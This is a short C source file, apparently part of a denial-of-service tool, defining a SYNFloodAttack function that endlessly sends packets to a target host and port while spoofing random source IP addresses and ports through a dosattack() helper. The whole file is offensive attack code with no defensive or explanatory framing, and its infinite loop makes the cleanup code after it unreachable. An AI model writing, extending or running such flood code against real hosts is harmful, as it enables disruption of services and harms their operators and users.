#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "../main.h"

int SYNFloodAttack(pInput input)
{
    char *rand_ip_addr = (char *)calloc(20, sizeof(char));
    int rport;
    struct AHTTP_INPUT *atmp = (struct AHTTP_INPUT *)malloc(sizeof(struct AHTTP_INPUT));
    debug(debug_level, 2, "ATTACK!!!!--------------");
    atmp->DstIP = host_addr;
    if (debug_level == 2)
    {
        atmp->MaxLoop = 10;
    }
    else
    {
        atmp->MaxLoop = -1;
    }
    debug(debug_level, 2, "Start sending data...");
    for (;;)
    {
        // Here get the rand ip address
        rand_ip(rand_ip_addr);
        atmp->SrcIP = rand_ip_addr;
        rport = rand_port();
        // rport is random source port
        atmp->SrcPort = rport;
        atmp->DstPort = port;
        dosattack(atmp);
    }
    free(atmp);
    return 0;
}